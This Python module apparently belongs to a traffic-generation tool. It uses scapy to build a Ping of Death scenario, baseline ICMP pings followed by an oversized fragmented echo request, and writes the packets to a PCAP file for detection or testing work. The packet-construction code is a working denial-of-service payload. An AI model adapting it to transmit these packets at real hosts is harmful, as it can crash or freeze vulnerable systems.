"""
Ping of Death Attack Generator

This module generates PCAP files containing a Ping of Death attack.
The Ping of Death attack involves sending malformed or oversized ICMP packets
that exceed the maximum IP packet size, causing buffer overflows or crashes
on vulnerable systems.
"""

import random
import time
from typing import List, Dict, Any
from scapy.all import Ether, IP, ICMP, wrpcap, fragment

# Import the attack base class
from .attack_base import AttackBase, AttackParameter


def generate_normal_pings(
    source_ip: str,
    target_ip: str,
    num_pings: int,
    base_time: float,
    sequence_start: int = 1,
    source_mac: str = "00:0c:29:1d:84:e1",
    target_mac: str = "00:0c:29:2a:3f:b2"
) -> List:
    """
    Generate normal ICMP echo request/reply pairs.
    
    Args:
        source_ip: IP address of the source (attacker)
        target_ip: IP address of the target (victim)
        num_pings: Number of normal ping exchanges to generate
        base_time: Starting timestamp
        sequence_start: Starting sequence number for ICMP packets
        source_mac: Source MAC address (default: VMware OUI)
        target_mac: Target MAC address (default: VMware OUI)
        
    Returns:
        List of normal ICMP packets
    """
    packets = []
    current_time = base_time
    
    for i in range(num_pings):
        seq_num = sequence_start + i
        
        # ICMP Echo Request (Type 8, Code 0)
        echo_request = Ether(src=source_mac, dst=target_mac) / IP(src=source_ip, dst=target_ip) / ICMP(
            type=8,  # Echo Request
            code=0,
            id=random.randint(1, 65535),
            seq=seq_num
        ) / (b'abcdefghijklmnopqrstuvwabcdefghi')  # 32 bytes of data (standard ping payload)
        
        # Recalculate checksums
        del echo_request[IP].chksum
        del echo_request[ICMP].chksum
        echo_request = Ether(bytes(echo_request))
        
        echo_request.time = current_time
        packets.append(echo_request)
        
        # Simulate RTT (Round Trip Time) between 1ms and 50ms
        rtt = random.uniform(0.001, 0.050)
        reply_time = current_time + rtt
        
        # ICMP Echo Reply (Type 0, Code 0)
        echo_reply = Ether(src=target_mac, dst=source_mac) / IP(src=target_ip, dst=source_ip) / ICMP(
            type=0,  # Echo Reply
            code=0,
            id=echo_request[ICMP].id,
            seq=seq_num
        ) / (b'abcdefghijklmnopqrstuvwabcdefghi')
        
        # Recalculate checksums
        del echo_reply[IP].chksum
        del echo_reply[ICMP].chksum
        echo_reply = Ether(bytes(echo_reply))
        
        echo_reply.time = reply_time
        packets.append(echo_reply)
        
        # Wait before next ping (typically 1 second between pings)
        current_time = reply_time + random.uniform(0.95, 1.05)
    
    return packets


def generate_ping_of_death(
    source_ip: str,
    target_ip: str,
    payload_size: int,
    base_time: float,
    sequence_num: int = 1000,
    source_mac: str = "00:0c:29:1d:84:e1",
    target_mac: str = "00:0c:29:2a:3f:b2"
) -> List:
    """
    Generate a Ping of Death attack using fragmented oversized ICMP packets.
    
    The Ping of Death exploits the fact that the IP protocol allows packets
    up to 65535 bytes, but many systems cannot handle reassembling such large
    ICMP packets. This creates an oversized ICMP Echo Request and fragments it.
    
    Args:
        source_ip: IP address of the attacker
        target_ip: IP address of the victim
        payload_size: Size of the malicious payload (should be > 65507)
        base_time: Timestamp for the attack packets
        sequence_num: Sequence number for the ICMP packet
        source_mac: Source MAC address (default: VMware OUI)
        target_mac: Target MAC address (default: VMware OUI)
        
    Returns:
        List of fragmented ICMP packets forming the Ping of Death
    """
    packets = []
    
    # Create an oversized ICMP Echo Request
    # Standard max IP packet size is 65535 bytes
    # IP header is 20 bytes, ICMP header is 8 bytes
    # So max ICMP data should be 65535 - 20 - 8 = 65507
    # We exceed this to create the "Ping of Death"
    
    # Ensure payload_size is large enough to be malicious
    if payload_size < 65508:
        payload_size = 65508  # Just over the limit
    
    # Create malicious payload
    payload = b'X' * payload_size
    
    # Create the oversized ICMP packet (without Ethernet for fragmentation)
    malicious_ping = IP(src=source_ip, dst=target_ip) / ICMP(
        type=8,  # Echo Request
        code=0,
        id=random.randint(1, 65535),
        seq=sequence_num
    ) / payload
    
    # Fragment the packet
    # The fragment() function will split this into multiple fragments
    # Each fragment will be < MTU (typically 1500 bytes)
    fragments = fragment(malicious_ping, fragsize=1400)
    
    # Add Ethernet headers to fragments and assign timestamps
    # Fragments are typically sent very quickly in succession
    current_time = base_time
    for i, frag in enumerate(fragments):
        # Wrap the IP fragment in an Ethernet frame
        eth_frag = Ether(src=source_mac, dst=target_mac) / frag
        eth_frag.time = current_time + (i * 0.0001)  # 0.1ms between fragments
        packets.append(eth_frag)
    
    return packets


def generate_ping_of_death_attack(
    attacker_ip: str,
    victim_ip: str,
    num_normal_pings: int = 5,
    payload_size: int = 70000,
    num_malicious: int = 1
) -> List:
    """
    Generate a complete Ping of Death attack scenario.
    
    This creates:
    1. Normal ping exchanges (to establish baseline traffic)
    2. The Ping of Death attack (oversized fragmented ICMP)
    
    Args:
        attacker_ip: IP address of the attacker
        victim_ip: IP address of the victim
        num_normal_pings: Number of normal pings before the attack
        payload_size: Size of malicious payload (default 70000 bytes)
        num_malicious: Number of malicious ping attacks to send
        
    Returns:
        List of all packets (normal + attack)
    """
    all_packets = []
    base_time = time.time()
    
    # Generate normal ping traffic first
    if num_normal_pings > 0:
        normal_packets = generate_normal_pings(
            source_ip=attacker_ip,
            target_ip=victim_ip,
            num_pings=num_normal_pings,
            base_time=base_time,
            sequence_start=1
        )
        all_packets.extend(normal_packets)
        
        # Update base_time to after normal pings
        if normal_packets:
            base_time = normal_packets[-1].time + random.uniform(0.5, 2.0)
    
    # Generate Ping of Death attack(s)
    for i in range(num_malicious):
        attack_packets = generate_ping_of_death(
            source_ip=attacker_ip,
            target_ip=victim_ip,
            payload_size=payload_size,
            base_time=base_time,
            sequence_num=1000 + i
        )
        all_packets.extend(attack_packets)
        
        # If multiple attacks, space them out
        if attack_packets and i < num_malicious - 1:
            base_time = attack_packets[-1].time + random.uniform(1.0, 3.0)
    
    return all_packets


class PingOfDeathAttack(AttackBase):
    """
    Ping of Death Attack generator implementing the AttackBase interface.
    Generates oversized ICMP packets that can crash or freeze vulnerable systems.
    """
    
    ATTACK_NAME = "Ping of Death"
    ATTACK_DESCRIPTION = "Sends oversized fragmented ICMP packets to crash or freeze the target"
    ATTACK_PARAMETERS = [
        AttackParameter(
            name="attacker_ip",
            param_type="ip",
            description="IP address of the attacker",
            required=True,
            validation_hint="e.g., 192.168.1.50"
        ),
        AttackParameter(
            name="victim_ip",
            param_type="ip",
            description="IP address of the victim/target",
            required=True,
            validation_hint="e.g., 192.168.1.100"
        ),
        AttackParameter(
            name="num_normal_pings",
            param_type="int",
            description="Number of normal pings before the attack",
            required=False,
            default=5,
            validation_hint="Default: 5 normal pings to establish baseline"
        ),
        AttackParameter(
            name="payload_size",
            param_type="int",
            description="Size of malicious payload in bytes (must be > 65507)",
            required=False,
            default=70000,
            validation_hint="Default: 70000 bytes (exceeds max IP packet size)"
        ),
        AttackParameter(
            name="num_malicious",
            param_type="int",
            description="Number of malicious Ping of Death attacks to send",
            required=False,
            default=1,
            validation_hint="Default: 1 attack"
        ),
    ]
    
    def generate(self, parameters: Dict[str, Any], output_path: str) -> bool:
        """
        Generate Ping of Death attack PCAP.
        
        Args:
            parameters: Dict with attack parameters
            output_path: Path to save the generated PCAP
            
        Returns:
            bool: True if successful
        """
        try:
            # Validate parameters
            is_valid, error_msg = self.validate_parameters(parameters)
            if not is_valid:
                raise ValueError(f"Invalid parameters: {error_msg}")
            
            attacker_ip = str(parameters.get('attacker_ip')).strip()
            victim_ip = str(parameters.get('victim_ip')).strip()
            num_normal_pings = int(parameters.get('num_normal_pings', 5))
            payload_size = int(parameters.get('payload_size', 70000))
            num_malicious = int(parameters.get('num_malicious', 1))
            
            # Validate payload size
            if payload_size < 65508:
                print(f"Warning: payload_size {payload_size} is too small for effective attack. Using 65508.")
                payload_size = 65508
            
            # Validate num_malicious
            if num_malicious < 1:
                num_malicious = 1
            
            # Generate attack packets
            packets = generate_ping_of_death_attack(
                attacker_ip=attacker_ip,
                victim_ip=victim_ip,
                num_normal_pings=num_normal_pings,
                payload_size=payload_size,
                num_malicious=num_malicious
            )
            
            if not packets:
                raise ValueError("No packets generated")
            
            # Save to PCAP file
            wrpcap(output_path, packets)
            print(f"Generated Ping of Death attack PCAP with {len(packets)} packets")
            return True
            
        except Exception as e:
            print(f"Error generating Ping of Death attack: {e}")
            import traceback
            traceback.print_exc()
            return False


# For standalone testing
if __name__ == "__main__":
    print("=== Ping of Death Attack Generator ===")
    
    attacker_ip = input("Enter attacker IP (default: 192.168.1.50): ").strip() or "192.168.1.50"
    victim_ip = input("Enter victim IP (default: 192.168.1.100): ").strip() or "192.168.1.100"
    
    num_normal = input("Number of normal pings (default: 5): ").strip()
    num_normal = int(num_normal) if num_normal else 5
    
    payload = input("Payload size in bytes (default: 70000): ").strip()
    payload = int(payload) if payload else 70000
    
    output_file = "ping_of_death_attack.pcap"
    
    print(f"\nGenerating attack:")
    print(f"  Attacker: {attacker_ip}")
    print(f"  Victim: {victim_ip}")
    print(f"  Normal pings: {num_normal}")
    print(f"  Payload size: {payload} bytes")
    
    packets = generate_ping_of_death_attack(
        attacker_ip=attacker_ip,
        victim_ip=victim_ip,
        num_normal_pings=num_normal,
        payload_size=payload,
        num_malicious=1
    )
    
    wrpcap(output_file, packets)
    print(f"\n✓ Generated {len(packets)} packets")
    print(f"✓ Saved to: {output_file}")
